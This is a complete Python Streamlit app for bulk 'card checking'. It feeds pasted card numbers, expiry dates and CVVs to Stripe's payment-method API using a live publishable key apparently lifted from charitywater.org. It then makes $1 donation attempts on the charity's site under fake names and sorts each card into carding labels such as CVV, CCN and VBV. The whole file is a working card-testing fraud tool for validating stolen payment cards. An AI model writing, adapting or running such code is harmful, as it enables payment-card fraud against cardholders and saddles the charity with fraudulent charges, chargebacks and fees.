import streamlit as st
import requests
import time

st.title("Bulk Card Checker (Stripe/CharityWater)")

cards_input = st.text_area("Paste up to 50 cards (one per line, format: cc|mm|yy|cvv):", height=200)
delay = st.slider("Delay between checks (seconds)", 1, 10, 2)
check_btn = st.button("Check Cards")

def check_card(card):
    parts = card.split('|')
    if len(parts) < 4:
        return {"card": card, "status": "error", "message": "Invalid format"}
    cc, mm, yy, cvv = [x.strip() for x in parts[:4]]

    # Stripe request
    stripe_headers = {
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    }
    stripe_data = (
        f"type=card"
        f"&billing_details[address][postal_code]=10002"
        f"&billing_details[address][city]=NY"
        f"&billing_details[address][country]=US"
        f"&billing_details[address][line1]=mera+ghar"
        f"&billing_details[email]=bentexpapa%40volku.org"
        f"&billing_details[name]=Skittle+ganda"
        f"&card[number]={cc}"
        f"&card[cvc]={cvv}"
        f"&card[exp_month]={mm}"
        f"&card[exp_year]={yy}"
        f"&guid=d94c27d9-c29d-44bf-9765-f86a81c79b60b142cd"
        f"&muid=173a3da0-ca24-4e42-affb-cc6b4ae48f6e29223e"
        f"&sid=fb0aae81-654b-4e23-a016-f87b2961e54bedd498"
        f"&pasted_fields=number"
        f"&payment_user_agent=stripe.js%2F16ce65ed9f%3B+stripe-js-v3%2F16ce65ed9f%3B+card-element"
        f"&referrer=https%3A%2F%2Fwww.charitywater.org"
        f"&time_on_page=124580"
        f"&key=pk_live_51049Hm4QFaGycgRKpWt6KEA9QxP8gjo8sbC6f2qvl4OnzKUZ7W0l00vlzcuhJBjX5wyQaAJxSPZ5k72ZONiXf2Za00Y1jRrMhU"
    )
    try:
        stripe_response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, timeout=20)
        stripe_json = stripe_response.json()
    except Exception as e:
        return {"card": card, "status": "error", "message": f"Stripe error: {str(e)}"}

    if "error" in stripe_json:
        msg = stripe_json["error"].get("message", "Stripe error")
        code = stripe_json["error"].get("code", "")
        # Map Stripe error codes to status
        if code == "incorrect_cvc":
            status = "CCN"
        elif code == "card_declined":
            status = "DECLINED"
        elif code == "incorrect_number":
            status = "CCN"
        elif code == "expired_card":
            status = "EXPIRED"
        else:
            status = "ERROR"
        return {"card": card, "status": status, "message": msg}

    payment_method_id = stripe_json.get('id')
    if not payment_method_id:
        return {"card": card, "status": "error", "message": "No payment method ID returned"}

    # CharityWater request
    charity_headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://www.charitywater.org',
        'referer': 'https://www.charitywater.org/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0',
    }
    charity_data = {
        'country': 'us',
        'payment_intent[email]': 'bentexpapa@volku.org',
        'payment_intent[amount]': '1',
        'payment_intent[currency]': 'usd',
        'payment_intent[payment_method]': payment_method_id,
        'disable_existing_subscription_check': 'false',
        'donation_form[amount]': '1',
        'donation_form[comment]': '',
        'donation_form[display_name]': '',
        'donation_form[email]': 'bentexpapa@volku.org',
        'donation_form[name]': 'Skittle',
        'donation_form[payment_gateway_token]': '',
        'donation_form[payment_monthly_subscription]': 'false',
        'donation_form[surname]': 'ganda',
        'donation_form[campaign_id]': 'a5826748-d59d-4f86-a042-1e4c030720d5',
        'donation_form[setup_intent_id]': '',
        'donation_form[subscription_period]': '',
        'donation_form[metadata][email_consent_granted]': 'false',
        'donation_form[metadata][full_donate_page_url]': 'https://www.charitywater.org/',
        'donation_form[metadata][phone_number]': '',
        'donation_form[metadata][plaid_account_id]': '',
        'donation_form[metadata][plaid_public_token]': '',
        'donation_form[metadata][uk_eu_ip]': 'false',
        'donation_form[metadata][url_params][touch_type]': '1',
        'donation_form[metadata][session_url_params][touch_type]': '1',
        'donation_form[metadata][with_saved_payment]': 'false',
        'donation_form[address][address_line_1]': 'mera ghar',
        'donation_form[address][address_line_2]': '',
        'donation_form[address][city]': 'NY',
        'donation_form[address][country]': '',
        'donation_form[address][zip]': '10002',
    }
    try:
        charity_response = requests.post('https://www.charitywater.org/donate/stripe', headers=charity_headers, data=charity_data, timeout=20)
        try:
            charity_json = charity_response.json()
        except Exception:
            charity_json = charity_response.text
    except Exception as e:
        return {"card": card, "status": "error", "message": f"CharityWater error: {str(e)}"}

    # Analyze CharityWater response
    resp_str = str(charity_json)
    if "redirectUrl" in resp_str or "/thank-you" in resp_str:
        status = "CVV"
        msg = "Donation Successful (Thank You Page)"
    elif "three_d_secure" in resp_str or "3d" in resp_str or "challenge" in resp_str:
        status = "VBV"
        msg = "3D Secure/VBV required"
    elif "incorrect_cvc" in resp_str or "cvc_check" in resp_str:
        status = "CCN"
        msg = "Incorrect CVC"
    else:
        status = "UNKNOWN"
        msg = resp_str[:200]  # Short preview

    return {"card": card, "status": status, "message": msg}

if check_btn:
    card_lines = [c.strip() for c in cards_input.strip().split('\n') if c.strip()]
    if len(card_lines) == 0:
        st.warning("Please enter at least one card.")
    elif len(card_lines) > 50:
        st.error("Limit is 50 cards per check.")
    else:
        results = []
        progress = st.progress(0)
        for idx, card in enumerate(card_lines):
            result = check_card(card)
            results.append(result)
            st.write(f"**{card}** → `{result['status']}`: {result['message']}")
            progress.progress((idx + 1) / len(card_lines))
            time.sleep(delay)
        st.success("Done checking all cards!")